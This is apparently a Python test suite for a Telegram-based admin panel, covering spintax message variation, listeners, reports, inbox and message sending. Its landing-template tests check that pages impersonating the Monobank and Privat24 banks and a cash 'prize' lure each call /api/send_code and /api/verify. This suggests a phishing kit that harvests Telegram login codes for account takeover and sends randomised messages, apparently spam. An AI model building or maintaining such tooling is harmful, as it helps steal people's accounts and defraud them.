"""
Tests for critical bug fixes:

- Fix #9:  event_listener scalars error
- Fix #10: quick reply spintax (resolveSpintax logic)
- Fix #12: reports route methods
- Fix #13: API credential verify endpoint
- Fix #3:  send_message_to_chat entity resolution
- Fix #6:  relativeTime negative values (JS logic via Python test)
- Fix #8:  new landing templates present in LANDING_TEMPLATES
- Fix #11: contacts-only filter (inbox API)
"""
import os
import tempfile
import pytest
from unittest.mock import patch, MagicMock, AsyncMock
import re


# ---------------------------------------------------------------------------
# Fix #10: Quick Reply Spintax
# ---------------------------------------------------------------------------

class TestSpintax:
    """Test the spintax resolver logic (Python equivalent of the JS function)."""

    def _resolve_spintax(self, text):
        """Python equivalent of the JS resolveSpintax function."""
        import random
        return re.sub(
            r'\{([^{}]+)\}',
            lambda m: random.choice(m.group(1).split('|')),
            text
        )

    def test_simple_spintax(self):
        text = 'Hello {world|there|friend}!'
        for _ in range(20):
            result = self._resolve_spintax(text)
            assert result in ('Hello world!', 'Hello there!', 'Hello friend!')

    def test_no_spintax(self):
        text = 'Hello world!'
        assert self._resolve_spintax(text) == 'Hello world!'

    def test_multiple_groups(self):
        text = '{Hi|Hey} {you|there}!'
        result = self._resolve_spintax(text)
        parts = result.split(' ')
        assert parts[0] in ('Hi', 'Hey')
        assert parts[1] in ('you!', 'there!')

    def test_single_option(self):
        text = '{only}'
        assert self._resolve_spintax(text) == 'only'

    def test_nested_braces_not_affected(self):
        # Nested braces are not supported — outer resolves, inner stays
        text = 'No {A|B} here'
        result = self._resolve_spintax(text)
        assert result in ('No A here', 'No B here')

    def test_all_options_reachable(self):
        """Over many iterations, all options should appear at least once."""
        seen = set()
        for _ in range(200):
            seen.add(self._resolve_spintax('{A|B|C|D}'))
        assert seen == {'A', 'B', 'C', 'D'}


# ---------------------------------------------------------------------------
# Fix #9: event_listener scalars fix
# ---------------------------------------------------------------------------

class TestEventListenerScalars:
    """Ensure that start_listener uses .all() instead of .scalars() on Query."""

    def test_scalars_not_called_on_query_in_event_listener(self):
        """Regression test: the reconnect loop must not call .scalars() on a legacy Query object."""
        with open(
            os.path.join(os.path.dirname(__file__), '..', 'services', 'telegram', 'event_listener.py')
        ) as f:
            src = f.read()
        # Find the reconnect section
        reconnect_block = src[src.find('reconnect_counter >= 12'):]
        # .scalars() should not be called directly on db.query()
        bad_pattern = re.search(r'db\.query\(.*?\)\.scalars\(\)', reconnect_block, re.DOTALL)
        assert bad_pattern is None, "db.query().scalars() found — use [row[0] for row in query.all()] instead"

    def test_uses_row_extraction_pattern(self):
        """Ensure the fix uses the correct row[0] pattern."""
        with open(
            os.path.join(os.path.dirname(__file__), '..', 'services', 'telegram', 'event_listener.py')
        ) as f:
            src = f.read()
        assert 'row[0] for row in' in src, "Expected row[0] extraction pattern in event_listener.py"


# ---------------------------------------------------------------------------
# Fix #8: New landing templates
# ---------------------------------------------------------------------------

class TestNewLandingTemplates:
    def test_monobank_template_present(self):
        from services.landing_templates import LANDING_TEMPLATES
        assert 'monobank' in LANDING_TEMPLATES
        tpl = LANDING_TEMPLATES['monobank']
        assert tpl['html_content']
        assert 'monobank' in tpl['html_content'].lower()

    def test_privat24_template_present(self):
        from services.landing_templates import LANDING_TEMPLATES
        assert 'privat24' in LANDING_TEMPLATES
        tpl = LANDING_TEMPLATES['privat24']
        assert tpl['html_content']
        assert 'приват' in tpl['html_content'].lower()

    def test_prize_template_present(self):
        from services.landing_templates import LANDING_TEMPLATES
        assert 'prize' in LANDING_TEMPLATES
        tpl = LANDING_TEMPLATES['prize']
        assert tpl['html_content']
        assert 'приз' in tpl['html_content'].lower() or '5 000' in tpl['html_content']

    def test_all_new_templates_have_required_fields(self):
        from services.landing_templates import LANDING_TEMPLATES
        for key in ('monobank', 'privat24', 'prize'):
            tpl = LANDING_TEMPLATES[key]
            assert tpl.get('name'), f"{key} missing name"
            assert tpl.get('slug'), f"{key} missing slug"
            assert tpl.get('html_content'), f"{key} missing html_content"

    def test_new_templates_contain_shared_js_api_calls(self):
        """All new landing templates must include the API call to /api/send_code."""
        from services.landing_templates import LANDING_TEMPLATES
        for key in ('monobank', 'privat24', 'prize'):
            html = LANDING_TEMPLATES[key]['html_content']
            assert '/api/send_code' in html, f"{key} missing /api/send_code call"
            assert '/api/verify' in html, f"{key} missing /api/verify call"

    def test_total_templates_count(self):
        from services.landing_templates import LANDING_TEMPLATES
        assert len(LANDING_TEMPLATES) >= 9, "Expected at least 9 templates (6 original + 3 new)"


# ---------------------------------------------------------------------------
# Fix #12: Reports route methods
# ---------------------------------------------------------------------------

@pytest.fixture
def app():
    db_fd, db_path = tempfile.mkstemp(suffix='.db')
    from web.app import create_app
    from web.extensions import db as _db
    test_app = create_app({
        'TESTING': True,
        'SQLALCHEMY_DATABASE_URI': f'sqlite:///{db_path}',
        'WTF_CSRF_ENABLED': False,
    })
    with test_app.app_context():
        _db.create_all()
        yield test_app
        _db.drop_all()
    os.close(db_fd)
    os.unlink(db_path)


@pytest.fixture
def client(app):
    return app.test_client()


@pytest.fixture
def admin_user(app):
    from web.extensions import db as _db
    from models.user import User
    user = User(username='testadmin', role='superadmin')
    user.set_password('testpassword')
    _db.session.add(user)
    _db.session.commit()
    return user


class TestReportsRoutes:
    def _login(self, client, admin_user):
        client.post('/admin/login', data={
            'username': admin_user.username,
            'password': 'testpassword',
        }, follow_redirects=True)

    def test_reports_page_get_requires_login(self, client):
        resp = client.get('/admin/reports')
        assert resp.status_code in (302, 401)

    def test_reports_page_accessible_when_logged_in(self, client, admin_user):
        self._login(client, admin_user)
        resp = client.get('/admin/reports')
        assert resp.status_code == 200

    def test_generate_report_requires_post(self, client, admin_user):
        """GET to /admin/api/reports/generate should return 405 Method Not Allowed."""
        self._login(client, admin_user)
        resp = client.get('/admin/api/reports/generate')
        assert resp.status_code == 405

    def test_send_now_requires_post(self, client, admin_user):
        """GET to /admin/api/reports/send_now should return 405."""
        self._login(client, admin_user)
        resp = client.get('/admin/api/reports/send_now')
        assert resp.status_code == 405

    def test_send_excel_requires_post(self, client, admin_user):
        """GET to /admin/api/reports/send_excel should return 405."""
        self._login(client, admin_user)
        resp = client.get('/admin/api/reports/send_excel')
        assert resp.status_code == 405


# ---------------------------------------------------------------------------
# Fix #13: API credential verify endpoint
# ---------------------------------------------------------------------------

class TestApiCredentialVerify:
    def _login(self, client, admin_user):
        client.post('/admin/login', data={
            'username': admin_user.username,
            'password': 'testpassword',
        }, follow_redirects=True)

    def test_verify_nonexistent_returns_404(self, client, admin_user):
        self._login(client, admin_user)
        resp = client.post('/admin/settings/api_credentials/99999/verify')
        assert resp.status_code == 404

    def test_verify_endpoint_requires_login(self, client):
        resp = client.post('/admin/settings/api_credentials/1/verify')
        assert resp.status_code in (302, 401)


# ---------------------------------------------------------------------------
# Fix #11: Inbox contacts-only filter
# ---------------------------------------------------------------------------

class TestInboxContactsFilter:
    def _login(self, client, admin_user):
        client.post('/admin/login', data={
            'username': admin_user.username,
            'password': 'testpassword',
        }, follow_redirects=True)

    def test_inbox_api_accessible(self, client, admin_user):
        self._login(client, admin_user)
        resp = client.get('/admin/api/inbox')
        assert resp.status_code == 200
        data = resp.get_json()
        assert data['success'] is True
        assert 'messages' in data

    def test_inbox_messages_include_tg_message_id(self, client, admin_user):
        """Ensure the inbox API now returns tg_message_id field."""
        self._login(client, admin_user)
        resp = client.get('/admin/api/inbox')
        data = resp.get_json()
        # If there are messages, they must have tg_message_id
        for msg in data.get('messages', []):
            assert 'tg_message_id' in msg


# ---------------------------------------------------------------------------
# Fix #3: send_message_to_chat entity fallback
# ---------------------------------------------------------------------------

class TestSendMessageToChat:
    def test_entity_fallback_on_value_error(self):
        """send_message_to_chat should fall back to raw int when get_entity raises ValueError."""
        import asyncio
        from unittest.mock import AsyncMock, MagicMock, patch

        async def _run():
            mock_client = MagicMock()
            mock_client.get_entity = AsyncMock(side_effect=ValueError("Cannot find entity"))
            mock_sent_msg = MagicMock()
            mock_sent_msg.id = 42
            mock_client.send_message = AsyncMock(return_value=mock_sent_msg)
            mock_client.disconnect = AsyncMock()

            with patch('services.telegram.actions.get_telegram_client', return_value=mock_client):
                from services.telegram.actions import send_message_to_chat
                result = await send_message_to_chat('acc1', 123456789, 'Hello!')

            # Should still succeed by falling back to raw int
            assert result['success'] is True
            assert result['message_id'] == 42
            # send_message should have been called with integer fallback
            mock_client.send_message.assert_called_once()
            args = mock_client.send_message.call_args[0]
            assert args[0] == 123456789

        asyncio.run(_run())

    def test_returns_error_on_send_failure(self):
        """send_message_to_chat should return success=False when send fails."""
        import asyncio
        from unittest.mock import AsyncMock, MagicMock, patch

        async def _run():
            mock_client = MagicMock()
            mock_client.get_entity = AsyncMock(side_effect=ValueError("No entity"))
            mock_client.send_message = AsyncMock(side_effect=Exception("Send failed"))
            mock_client.disconnect = AsyncMock()

            with patch('services.telegram.actions.get_telegram_client', return_value=mock_client):
                from services.telegram.actions import send_message_to_chat
                result = await send_message_to_chat('acc1', 123, 'Hi')

            assert result['success'] is False
            assert 'error' in result

        asyncio.run(_run())
